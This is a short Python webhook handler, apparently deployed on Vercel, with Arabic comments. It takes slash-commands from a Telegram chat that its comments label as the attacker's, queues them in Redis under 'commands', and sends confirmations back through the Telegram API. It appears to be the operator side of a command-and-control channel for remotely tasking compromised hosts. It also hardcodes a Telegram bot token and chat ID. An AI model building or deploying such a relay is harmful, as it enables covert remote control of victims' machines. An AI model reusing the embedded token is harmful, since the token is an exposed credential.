import json
import os
from http.server import BaseHTTPRequestHandler
import requests
import redis

# إعداد Redis (Vercel KV)
redis_url = os.environ.get("REDIS_URL")  # ستضيفه في إعدادات Vercel
r = redis.from_url(redis_url)

BOT_TOKEN = "8573086497:AAH6daFBxrgYIplpagMJrM5RNKqGLDAvXSY"
YOUR_CHAT_ID = "6897156984"

def send_telegram_message(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": chat_id, "text": text})

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = json.loads(self.rfile.read(content_length))
        
        # التحقق من أن الرسالة من المهاجم
        message = body.get('message')
        if not message:
            self.send_response(200)
            self.end_headers()
            return
        
        chat_id = str(message.get('chat', {}).get('id'))
        if chat_id != YOUR_CHAT_ID:
            self.send_response(200)
            self.end_headers()
            return
        
        text = message.get('text', '')
        if not text.startswith('/'):
            self.send_response(200)
            self.end_headers()
            return
        
        # تخزين الأمر في Redis (قائمة انتظار)
        command = text[1:]  # إزالة /
        r.rpush("commands", command)  # أضف إلى نهاية القائمة
        
        send_telegram_message(YOUR_CHAT_ID, f"✅ تم تخزين الأمر: {command}")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
